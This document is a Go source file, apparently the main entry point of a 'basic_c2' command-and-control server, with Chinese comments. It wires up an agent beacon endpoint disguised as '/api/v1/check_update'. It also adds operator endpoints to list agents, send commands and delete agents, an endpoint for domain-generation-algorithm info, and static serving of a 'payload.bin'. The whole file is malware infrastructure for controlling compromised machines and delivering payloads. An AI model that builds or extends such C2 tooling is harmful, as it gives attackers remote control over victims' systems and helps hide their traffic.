package main

import (
	"basic_c2/internal/config"
	"basic_c2/server/handlers"
	"basic_c2/server/storage"
	"fmt"
	"net/http"
)

func main() {
	// 初始化内存数据库
	store := storage.NewMemory()

	// 初始化处理器
	handler := handlers.NewHandler(store)

	// 1. Agent 通信接口
	http.HandleFunc("/api/v1/check_update", handler.AgentHeartbeat)

	// 2. Web 控制台接口
	http.HandleFunc("/api/admin/agents", handler.GetAgents)
	http.HandleFunc("/api/admin/cmd", handler.SendCommand)
	http.HandleFunc("/api/admin/delete", handler.DeleteAgent)

	// [新增] DGA 信息接口
    http.HandleFunc("/api/admin/dga", handlers.ApiGetCurrentDGA)

	// 3. 静态文件服务（index.html, payload.bin）
	// 从 web/ 目录提供静态文件
	http.Handle("/", http.FileServer(http.Dir("./web")))

	fmt.Println("[*] C2 Server (Refactored Version) 启动: 监听", config.ServerAddr)
	
	// 启动服务器
	if err := http.ListenAndServe(config.ServerAddr, nil); err != nil {
		fmt.Println("启动失败:", err)
	}
}
